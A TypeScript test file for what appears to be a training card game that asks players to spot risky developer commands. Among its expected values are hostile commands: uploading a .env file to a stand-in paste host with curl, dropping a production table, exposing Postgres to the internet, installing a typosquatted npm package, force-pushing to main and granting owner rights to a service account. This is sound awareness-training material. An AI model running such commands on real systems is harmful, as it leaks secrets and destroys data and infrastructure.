import assert from "node:assert";
import fs from "node:fs";
import path from "node:path";
import { describe, it } from "node:test";
import { Card } from "../src/types";

describe("Cards and Rounds Specification Verification", () => {
  const cardsPath = path.resolve(process.cwd(), "data/cards.json");
  const roundsPath = path.resolve(process.cwd(), "data/rounds.json");

  it("cards.json exists and contains exactly 18 cards with required IDs", () => {
    assert(fs.existsSync(cardsPath), "data/cards.json must exist");
    const cards: Card[] = JSON.parse(fs.readFileSync(cardsPath, "utf-8"));

    assert.strictEqual(cards.length, 18, "Must contain exactly 18 cards");

    const expectedNormalIds = [
      "N1", "N2", "N3", "N4", "N5", "N6", "N7", "N8", "N9", "N10", "N11", "N12"
    ];
    const expectedRiskyIds = ["R1", "R2", "R3", "R4", "R5", "R6"];
    const allExpectedIds = [...expectedNormalIds, ...expectedRiskyIds];

    const cardIds = cards.map((c) => c.id);
    assert.deepStrictEqual(
      cardIds.sort(),
      allExpectedIds.sort(),
      "Card IDs must be exactly N1-N12 and R1-R6"
    );

    // Verify isRisky flags
    for (const card of cards) {
      if (card.id.startsWith("N")) {
        assert.strictEqual(card.isRisky, false, `${card.id} must have isRisky: false`);
      } else if (card.id.startsWith("R")) {
        assert.strictEqual(card.isRisky, true, `${card.id} must have isRisky: true`);
      }
    }
  });

  it("R4 command is exactly 'npm install date-fnss'", () => {
    const cards: Card[] = JSON.parse(fs.readFileSync(cardsPath, "utf-8"));
    const r4 = cards.find((c) => c.id === "R4");
    assert(r4, "R4 must exist in cards.json");
    assert.strictEqual(
      r4.command,
      "npm install date-fnss",
      "R4 command must match character for character including deliberate typo"
    );
  });

  it("verifies exact commands character for character for all cards", () => {
    const cards: Card[] = JSON.parse(fs.readFileSync(cardsPath, "utf-8"));
    const cardMap = new Map(cards.map((c) => [c.id, c.command]));

    assert.strictEqual(cardMap.get("N1"), "npm test -- checkout.spec.ts");
    assert.strictEqual(cardMap.get("N2"), "git diff src/checkout/price.ts");
    assert.strictEqual(cardMap.get("N3"), "npm install date-fns");
    assert.strictEqual(cardMap.get("N4"), "rm -rf ./dist");
    assert.strictEqual(cardMap.get("N5"), "gcloud run deploy store-staging --source . --region asia-south1");
    assert.strictEqual(cardMap.get("N6"), "gcloud run services logs read store-staging --limit 50");
    assert.strictEqual(cardMap.get("N7"), 'psql $STAGING_DB -c "ALTER TABLE orders ADD COLUMN gift_note text"');
    assert.strictEqual(cardMap.get("N8"), 'git commit -am "Fix rounding in checkout total"');
    assert.strictEqual(cardMap.get("N9"), "git push origin fix/checkout-rounding");
    assert.strictEqual(cardMap.get("N10"), 'psql $STAGING_DB -c "SELECT count(*) FROM inventory"');
    assert.strictEqual(cardMap.get("N11"), "npx prettier --write src/");
    assert.strictEqual(cardMap.get("N12"), 'psql $STAGING_DB -c "DELETE FROM orders WHERE email LIKE \'%@test.example.invalid\'"');

    assert.strictEqual(cardMap.get("R1"), 'psql $PROD_DB -c "DROP TABLE orders_backup_2025"');
    assert.strictEqual(cardMap.get("R2"), "gcloud compute firewall-rules create allow-review --allow tcp:5432 --source-ranges 0.0.0.0/0");
    assert.strictEqual(cardMap.get("R3"), 'curl -F "file=@.env" https://paste.example.invalid/upload');
    assert.strictEqual(cardMap.get("R4"), "npm install date-fnss");
    assert.strictEqual(cardMap.get("R5"), "git push --force origin main");
    assert.strictEqual(
      cardMap.get("R6"),
      "gcloud projects add-iam-policy-binding kaveri-prod --member serviceAccount:ci-bot@kaveri-prod.iam.gserviceaccount.com --role roles/owner"
    );
  });

  it("rounds.json has Round A and Round B with risky cards in positions 4 and 7", () => {
    assert(fs.existsSync(roundsPath), "data/rounds.json must exist");
    const rounds = JSON.parse(fs.readFileSync(roundsPath, "utf-8"));

    assert.deepStrictEqual(rounds.roundA.cardIds, ["N1", "N3", "N4", "R2", "N5", "N7", "R5", "N9"]);
    assert.deepStrictEqual(rounds.roundB.cardIds, ["N2", "N6", "N8", "R1", "N10", "N11", "R3", "N12"]);

    // Position 4 (index 3) and Position 7 (index 6) must be risky
    assert(rounds.roundA.cardIds[3].startsWith("R"), "Round A position 4 must be risky");
    assert(rounds.roundA.cardIds[6].startsWith("R"), "Round A position 7 must be risky");
    assert(rounds.roundB.cardIds[3].startsWith("R"), "Round B position 4 must be risky");
    assert(rounds.roundB.cardIds[6].startsWith("R"), "Round B position 7 must be risky");
  });
});
